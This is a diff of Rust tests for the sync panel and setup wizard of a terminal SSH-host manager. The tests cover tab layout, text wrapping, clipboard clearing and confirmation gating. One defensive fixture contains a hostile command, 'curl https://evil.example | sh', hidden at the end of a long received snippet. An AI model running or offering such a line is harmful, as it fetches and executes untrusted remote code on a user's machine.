@@ -23,6 +23,7 @@ use crate::app::{Focus, test_app};
 use crate::dialog::ARM_DELAY;
 use crate::host_list::test_host;
 use crate::sync_panel::{PassKind, SyncData};
+use crate::sync_wizard::Step;
 
 fn screen(app: &mut App, cols: u16, rows: u16) -> Vec<String> {
     let mut terminal = Terminal::new(TestBackend::new(cols, rows)).unwrap();
@@ -243,7 +244,7 @@ fn open_panel(app: &mut App, tab: SyncTab) {
         }),
         summary: portico_core::ErrorSummary {
             code: "sync_alias_shadowed".into(),
-            message: "legacy is already defined in ~/.ssh/config".into(),
+            message: "`legacy` is already defined in ~/.ssh/config".into(),
             hint: Some("Rename one of them, or skip it on this device.".into()),
         },
         warning: false,
@@ -263,8 +264,11 @@ fn the_status_bar_says_how_sync_is_doing() {
     // say by whom.
     let all = lines.join("\n");
     assert!(all.contains("web ⇅"), "{all}");
-    assert!(all.contains("changed by desk (77a1b2c3)"), "{all}");
+    // B15: the device id only from 120 columns.
+    assert!(all.contains("⇅ changed by desk · S review"), "{all}");
     assert!(all.contains("wait for your confirmation"), "{all}");
+    let wide = text(&mut app, 120, 36);
+    assert!(wide.contains("changed by desk (77a1b2c3)"), "{wide}");
 
     // Sync off, nothing waiting: `Sync off`, only when there is room.
     let mut app = test_app();
@@ -281,33 +285,63 @@ fn the_status_bar_says_how_sync_is_doing() {
 }
 
 #[test]
-fn panel_overview_lists_devices_and_actions_at_80x24() {
+fn panel_overview_and_devices_at_80x24() {
     let mut app = synced_app();
     open_panel(&mut app, SyncTab::Overview);
-    let all = text(&mut app, 80, 24);
+    let lines = screen(&mut app, 80, 24);
+    let all = lines.join("\n");
     for want in [
         "Synced 2 min ago",
         "Dropbox/Portico",
-        "laptop (3f9c0ae1)",
+        "sync now",
+        "turn sync off",
+        // B5: the GUI's tabs, in its order.
+        "Overview",
+        "Conflicts 2",
+        "Received 3",
+        "Issues 1",
+        "Devices",
+    ] {
+        assert!(all.contains(want), "{want}:\n{all}");
+    }
+    // B15: the panel's keys are not said twice: the bar points to `?`.
+    let bar = lines.last().unwrap();
+    assert!(bar.contains("SYNC") && bar.contains("?  help"), "{bar}");
+    assert!(!bar.contains("sync now"), "{bar}");
+
+    open_panel(&mut app, SyncTab::Devices);
+    let all = text(&mut app, 80, 24);
+    for want in [
+        "● laptop (3f9c0ae1)",
         "this device",
         "desk (77a1b2c3)",
         "inactive",
-        "sync now",
-        "Conflicts 2",
-        "Hosts 2",
-        "Snippets 1",
     ] {
         assert!(all.contains(want), "{want}:\n{all}");
     }
 }
 
+/// B2 (S1c review): the core quotes identifiers; the alias stays as
+/// written (never `Legacy`), without its backticks.
+#[test]
+fn legacy_is_already_defined() {
+    let mut app = synced_app();
+    open_panel(&mut app, SyncTab::Issues);
+    let all = text(&mut app, 80, 24);
+    assert!(
+        all.contains("Host legacy · legacy is already defined"),
+        "{all}"
+    );
+    assert!(!all.contains('`'), "{all}");
+}
+
 #[test]
 fn received_hosts_show_both_destinations_whole() {
     let mut app = synced_app();
-    open_panel(&mut app, SyncTab::Hosts);
-    let lines = screen(&mut app, 80, 24);
+    open_panel(&mut app, SyncTab::Received);
+    let lines = screen(&mut app, 120, 36);
     let all = lines.join("\n");
-    assert!(all.contains("Now on this device"), "{all}");
+    assert!(all.contains("On this device"), "{all}");
     assert!(all.contains("10.0.0.5"), "{all}");
     // Wrapped, never cut: the pieces put back together.
     // (The `◂` mark of a changed value is not part of it.)
@@ -318,15 +352,59 @@ fn received_hosts_show_both_destinations_whole() {
     assert!(joined.contains(LONG_HOST), "{all}");
     assert!(all.contains('◂'), "the changed value is marked: {all}");
     assert!(!all.contains("example-corp…"), "{all}");
+    // B15: wrapped where it reads, after a `.` or a `-`.
+    assert!(all.contains("ip-10-20-30-40.eu-west-3.compute.  "), "{all}");
+    assert!(all.contains("  internal.example-corp.net  "), "{all}");
     // No bulk confirmation: `y` confirms the item shown.
     assert!(all.contains("confirm"), "{all}");
     assert!(!all.to_lowercase().contains("confirm all"), "{all}");
 }
 
+/// A1 (S1c review, TUI parity with the GUI): at 80×24 the card of a
+/// received item does not fit; `y` waits until its last line has been on
+/// screen.
+#[test]
+fn a_received_item_is_confirmed_only_once_read_to_the_end() {
+    let mut app = synced_app();
+    let long: Vec<String> = (1..=12).map(|i| format!("echo step {i}")).collect();
+    app.sync.snippets = vec![UnconfirmedSnippet {
+        snippet: SyncSnippetValue {
+            command: format!("{}\ncurl https://evil.example | sh", long.join("\n")),
+            ..snippets().remove(0).snippet
+        },
+        ..snippets().remove(0)
+    }];
+    select_snippet(&mut app);
+    let all = text(&mut app, 80, 24);
+    assert!(all.contains("more"), "the end is below the fold: {all}");
+    assert!(all.contains("read to the end"), "{all}");
+    app.update(Action::SyncKey(key(KeyCode::Char('y'))));
+    assert!(
+        app.sync_panel.as_ref().unwrap().busy.is_none(),
+        "nothing sent before the end was shown"
+    );
+    for _ in 0..10 {
+        app.update(Action::SyncKey(key(KeyCode::PageDown)));
+        let _ = text(&mut app, 80, 24);
+    }
+    assert!(app.sync_panel.as_ref().unwrap().read_to_end(&app.sync));
+    app.update(Action::SyncKey(key(KeyCode::Char('y'))));
+    assert!(
+        app.sync_panel.as_ref().unwrap().busy.is_some(),
+        "confirmed once read"
+    );
+}
+
+fn select_snippet(app: &mut App) {
+    open_panel(app, SyncTab::Received);
+    let panel = app.sync_panel.as_mut().unwrap();
+    panel.select_snippet(&app.sync, "restart-payments");
+}
+
 #[test]
 fn received_snippets_show_the_whole_command() {
     let mut app = synced_app();
-    open_panel(&mut app, SyncTab::Snippets);
+    select_snippet(&mut app);
     let lines = screen(&mut app, 120, 36);
     let joined: String = lines.iter().map(|l| l.replace([' ', '│'], "")).collect();
     for line in LONG_COMMAND.lines() {
@@ -337,7 +415,56 @@ fn received_snippets_show_the_whole_command() {
         );
     }
     let all = lines.join("\n");
-    assert!(all.contains("Runs when sent"), "{all}");
+    assert!(
+        all.contains("▲ Runs as soon as it is sent (Enter is added)."),
+        "{all}"
+    );
+    assert!(all.contains("2 lines · 196 characters"), "{all}");
+}
+
+/// A2 (S1c review): a tab of a received command is typed with the rest:
+/// it shows, as a muted `→`, never dropped.
+#[test]
+fn a_received_command_shows_its_tabs() {
+    let mut app = synced_app();
+    app.sync.snippets = vec![UnconfirmedSnippet {
+        snippet: SyncSnippetValue {
+            command: "printf 'a\tb'\tid".into(),
+            ..snippets().remove(0).snippet
+        },
+        ..snippets().remove(0)
+    }];
+    select_snippet(&mut app);
+    let all = text(&mut app, 120, 36);
+    assert!(all.contains("printf 'a→b'→id"), "{all}");
+}
+
+/// A4 (S1c review): a copied passphrase is cleared from the clipboard 30 s
+/// later, unless Portico copied something else meanwhile.
+#[test]
+fn a_copied_passphrase_is_cleared_unless_overwritten() {
+    let mut app = test_app();
+    app.clipboard = false;
+    app.copy_passphrase("alpha beta gamma");
+    let copied = app.clipboard_secret.get();
+    assert!(
+        app.toast
+            .as_ref()
+            .is_some_and(|t| t.message == "Copied — cleared from the clipboard in 30 s")
+    );
+    app.update(Action::SyncClearClipboard(copied));
+    assert_ne!(
+        app.clipboard_secret.get(),
+        copied,
+        "cleared (an empty copy)"
+    );
+    // Something else copied after it: its clearing no longer applies.
+    app.copy_passphrase("alpha beta gamma");
+    let copied = app.clipboard_secret.get();
+    app.osc52("another text");
+    let after = app.clipboard_secret.get();
+    app.update(Action::SyncClearClipboard(copied));
+    assert_eq!(app.clipboard_secret.get(), after, "left alone");
 }
 
 #[test]
@@ -346,14 +473,16 @@ fn conflicts_preselect_union_and_mark_differing_fields() {
     open_panel(&mut app, SyncTab::Conflicts);
     let all = text(&mut app, 80, 24);
     assert!(all.contains("Tags of web"), "{all}");
-    assert!(all.contains("● Union of all sides"), "{all}");
+    assert!(all.contains("● Union of all tags"), "{all}");
+    assert!(all.contains("Keep desk (77a1b2c3)'s"), "{all}");
     assert!(all.contains("#prod #eu #web"), "{all}");
 }
 
 #[test]
 fn a_reload_in_flight_blocks_decisions() {
     let mut app = synced_app();
-    open_panel(&mut app, SyncTab::Hosts);
+    open_panel(&mut app, SyncTab::Received);
+    app.sync_panel.as_mut().unwrap().seen_end = Some("hash-web".into());
     app.update(Action::Engine(EngineEvent::SyncPendingChanged));
     assert!(app.sync.stale());
     app.update(Action::SyncKey(key(KeyCode::Char('y'))));
@@ -375,7 +504,7 @@ fn a_reload_in_flight_blocks_decisions() {
 #[test]
 fn results_say_what_happened() {
     let mut app = synced_app();
-    open_panel(&mut app, SyncTab::Hosts);
+    open_panel(&mut app, SyncTab::Received);
     app.update(Action::SyncDone {
         op: SyncOp::ConfirmHost("web".into()),
         result: Err(portico_core::ErrorSummary {
@@ -417,7 +546,7 @@ fn settings_received_through_sync_apply_live() {
 }
 
 #[test]
-fn the_wizard_walks_to_the_recovery_warning() {
+fn the_wizard_gates_create_on_the_recovery_box() {
     let mut app = test_app();
     app.sync.overview = Some(SyncOverview {
         status: SyncStatus::Disabled,
@@ -461,19 +590,19 @@ fn the_wizard_walks_to_the_recovery_warning() {
     for c in "correct horse battery staple".chars() {
         app.update(Action::SyncWizardKey(key(KeyCode::Char(c))));
     }
+    // Q1: nothing is created before "I saved it…", on the same step.
     app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
     assert!(matches!(
         app.sync_wizard.as_ref().unwrap().step,
-        Step::Recovery
+        Step::Create
     ));
     let all = text(&mut app, 80, 24);
     assert!(all.contains("cannot be recovered"), "{all}");
-    // Nothing happens before "I understand".
-    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
-    assert!(matches!(
-        app.sync_wizard.as_ref().unwrap().step,
-        Step::Recovery
-    ));
+    assert!(all.contains("I saved it."), "{all}");
+    assert!(
+        all.contains("Save the passphrase, then check this box"),
+        "{all}"
+    );
     app.update(Action::SyncWizardKey(key(KeyCode::Char(' '))));
     app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
     assert!(matches!(
@@ -494,6 +623,13 @@ fn the_wizard_walks_to_the_recovery_warning() {
         "{all}"
     );
     assert!(all.contains("five random words"), "{all}");
+
+    // Success: the wizard closes onto the panel, "Sync is on".
+    app.update(Action::SyncSetUp(Ok(SyncStatus::Syncing)));
+    assert!(app.sync_wizard.is_none());
+    assert_eq!(app.overlay, Some(Overlay::Sync));
+    let notice = app.sync_panel.as_ref().unwrap().notice.clone().unwrap();
+    assert!(notice.ok && notice.message == "Sync is on");
 }
 
 #[test]
@@ -527,6 +663,21 @@ fn an_expired_review_asks_for_the_passphrase_again() {
     assert!(all.contains("2 conflicts"), "{all}");
     assert!(all.contains("Review each conflict"), "{all}");
     assert!(all.contains("wait for your confirmation"), "{all}");
+    assert!(all.contains("30 tags, groups, notes"), "{all}");
+    // Q1: the box gates Join.
+    assert!(all.contains("I saved it."), "{all}");
+    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
+    assert!(matches!(
+        app.sync_wizard.as_ref().unwrap().step,
+        Step::Review
+    ));
+    assert!(text(&mut app, 80, 24).contains("Save the passphrase, then check this box"));
+    app.update(Action::SyncWizardKey(key(KeyCode::Char(' '))));
+    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
+    assert!(matches!(
+        app.sync_wizard.as_ref().unwrap().step,
+        Step::Working(_)
+    ));
     app.update(Action::SyncSetUp(Err(portico_core::ErrorSummary {
         code: "sync_join_expired".into(),
         message: "the join review expired".into(),
@@ -647,17 +798,13 @@ async fn join_through_the_wizard_then_confirm_a_received_host() {
         .0
         .clone();
     assert_eq!(preview.hosts, 1);
-    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
     app.update(Action::SyncWizardKey(key(KeyCode::Char(' '))));
     app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
     pump(&mut app, &mut events, |a| {
-        a.sync_wizard
-            .as_ref()
-            .is_some_and(|w| matches!(w.step, Step::Done(_)) || w.error.is_some())
+        a.sync_wizard.as_ref().is_none_or(|w| w.error.is_some())
     })
     .await;
-    assert!(app.sync_wizard.as_ref().unwrap().error.is_none());
-    app.update(Action::SyncWizardKey(key(KeyCode::Enter)));
+    assert!(app.sync_wizard.is_none(), "closed onto the panel");
     assert_eq!(app.overlay, Some(Overlay::Sync));
 
     // The received host waits: never written before the confirmation.
@@ -667,8 +814,8 @@ async fn join_through_the_wizard_then_confirm_a_received_host() {
     .await;
     let inventory = me.engine.load_hosts().await.unwrap();
     assert!(!inventory.hosts.iter().any(|h| h.alias == "web"));
-    app.update(Action::SyncKey(key(KeyCode::Char('4'))));
-    let all = text(&mut app, 80, 24);
+    app.update(Action::SyncKey(key(KeyCode::Char('3'))));
+    let all = text(&mut app, 120, 36);
     assert!(all.contains("203.0.113.10"), "{all}");
     assert!(all.contains("new from Laptop"), "{all}");
     tokio::time::sleep(ARM_DELAY + Duration::from_millis(50)).await;
@@ -742,8 +889,15 @@ fn sync_captures() {
         ("panel-overview", |a| open_panel(a, SyncTab::Overview)),
         ("panel-conflicts", |a| open_panel(a, SyncTab::Conflicts)),
         ("panel-issues", |a| open_panel(a, SyncTab::Issues)),
-        ("pending-host", |a| open_panel(a, SyncTab::Hosts)),
-        ("snippet-review", |a| open_panel(a, SyncTab::Snippets)),
+        ("panel-devices", |a| open_panel(a, SyncTab::Devices)),
+        ("pending-host", |a| open_panel(a, SyncTab::Received)),
+        ("pending-host-end", |a| {
+            open_panel(a, SyncTab::Received);
+            for _ in 0..10 {
+                a.update(Action::SyncKey(key(KeyCode::PageDown)));
+            }
+        }),
+        ("snippet-review", select_snippet),
         ("panel-alert", |a| {
             a.sync.overview = Some(SyncOverview {
                 status: SyncStatus::Alert {
@@ -832,11 +986,17 @@ fn sync_captures() {
                 Instant::now(),
             );
         }),
-        ("wizard-recovery", |a| {
+        ("wizard-saved", |a| {
             wizard_at_folder(a);
-            let wizard = a.sync_wizard.as_mut().unwrap();
-            wizard.step = Step::Recovery;
-            wizard.understood = true;
+            a.update(Action::SyncProbed {
+                folder: "~/Dropbox/Portico".into(),
+                result: Ok(portico_core::sync::FolderProbe::Usable),
+            });
+            a.update(Action::SyncWizardKey(key(KeyCode::Enter)));
+            a.update(Action::SyncGenerated(
+                portico_core::sync::generate_passphrase().map_err(|e| e.summary()),
+            ));
+            a.update(Action::SyncWizardKey(key(KeyCode::Enter)));
         }),
     ];
     for (theme, id) in [("obsidian", "obsidian"), ("marble", "marble")] {
